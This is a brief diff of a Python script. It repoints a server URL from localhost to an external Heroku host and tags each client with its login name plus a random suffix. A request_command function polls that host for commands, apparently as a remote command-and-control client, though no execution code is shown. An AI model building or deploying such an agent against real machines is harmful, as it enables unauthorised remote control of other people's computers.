@@ -11,10 +11,10 @@ def set_interval(func, sec):
   t.start()
   return t
 
-url = 'http://localhost'
+url = 'https://data-leaf.herokuapp.com'
 
-username = getlogin()
-print(username + '.' + token_hex(4))
+username = getlogin() + '.' + token_hex(4)
+print(username)
 
 def request_command():
   command = requests.get(url + '/get/' + username)
